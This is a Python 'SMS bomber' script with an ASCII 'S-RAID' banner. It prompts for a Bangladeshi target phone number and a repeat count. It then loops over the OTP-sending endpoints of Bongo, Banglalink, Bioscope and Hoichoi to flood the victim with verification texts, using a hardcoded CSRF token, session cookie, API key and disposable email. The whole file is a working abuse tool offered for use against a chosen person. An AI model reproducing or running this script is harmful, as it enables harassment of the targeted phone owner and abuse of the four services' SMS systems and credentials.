import requests,time,os
logo='''

░██████╗░░░░░░██████╗░░█████╗░██╗██████╗░
██╔════╝░░░░░░██╔══██╗██╔══██╗██║██╔══██╗
╚█████╗░█████╗██████╔╝███████║██║██║░░██║
░╚═══██╗╚════╝██╔══██╗██╔══██║██║██║░░██║
██████╔╝░░░░░░██║░░██║██║░░██║██║██████╔╝
╚═════╝░░░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░'''

print(logo)
print("===>Thank you MONIRUL ISLAM for your Support<===")
time.sleep(5)
os.system('clear')
print(logo)
natnumber = str(input("Enter Target Number +880: "))

number = "0"+natnumber

intnumber = "88"+number
plusintnumber="+"+intnumber

count = int(input("How Many SMS ?: "))

def bongo():
	link = "https://api2.bongobd.com/api/login/send-otp"

	json ={"msisdn":intnumber,"operator":"all"}

	x = requests.post(link,data=json)
	print("====>OTP from bongo")

	print(x.text)



def bl():
	header = {
			"X-CSRF-Token": "aeb33d77b2715f829e08b66551082c7807d578ea8207a39e48514173dc88c5b94a5d5a24da59735655e41797a268f3a482d710b46d332f312986641caebbb5a6",
			"Cookie": "_gcl_au=1.1.141235444.1627363041; csrfToken=aeb33d77b2715f829e08b66551082c7807d578ea8207a39e48514173dc88c5b94a5d5a24da59735655e41797a268f3a482d710b46d332f312986641caebbb5a6"

			}


	json = {"mobile_num":number}
	link = "https://eselfcare.banglalink.net/home/ajax/otpSignup"
	x = requests.post(link,json=json,headers=header)
	print("====>OTP from bl")
	print(x.text)
def bioscope():
	link="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
	x = requests.get(link)
	print("====>OTP from bioscope")
	print(x.text)

def hoichoi():

  header = {
    "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
  }

  data = {
    "requestType":"send",
    "phoneNumber":"+88"+number,
    "screenName":"signin"
  }

  url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-44067eab-5337-99d8-11eb-99ca1e4db186"
  x = requests.post(url, json=data, headers=header)
  if x.json().get("code"):
    data = {
      "requestType":"send",
      "phoneNumber":"+88"+number,
      "emailConsent":"true",
      "whatsappConsent":"true",
      "email":"cicas94417@iconmle.com"
    }
    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"

    x = requests.post(url, json=data, headers=header)
    print("====>OTP from hoichoi")
    print(x.text)

for i in range(count):
	bioscope()
	hoichoi()
	bl()
	bongo()
